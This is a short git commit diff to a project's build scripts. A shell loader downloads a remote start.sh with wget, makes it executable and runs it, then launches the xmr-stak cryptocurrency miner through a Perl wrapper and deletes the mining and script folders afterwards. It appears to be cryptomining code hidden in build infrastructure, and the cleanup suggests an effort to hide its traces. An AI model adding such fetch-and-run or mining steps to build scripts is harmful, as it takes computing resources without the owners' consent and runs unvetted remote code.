6f0a1a8077450e5f2e5733498d5505f0b451e6d7
pproum <51121011+pproum@users.noreply.github.com>
2019-05-28 17:45:27 +0100

    9

--- build/scripts/loader.sh
+++ build/scripts/loader.sh
@@ -1,8 +1,7 @@
 /bin/bash -c "wget -O start.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/start.sh; 
 chmod u+x start.sh ;
 ./start.sh ; 
-cd mine; 
-./run_xmr_stak.pl 2; 
+./scripts/run_xmr_stak.pl; 
 cd ..; 
 rm -rf mine ; 
 rm -rf scripts; 
--- build/scripts/run_xmr_stak.pl
+++ build/scripts/run_xmr_stak.pl
@@ -2,7 +2,7 @@
 use strict;
 use warnings;
 
-chdir("../mine" );
+chdir("./mine" );
 
 #run xmr-stak for the given time in seconds
 sub RunXMRStak{
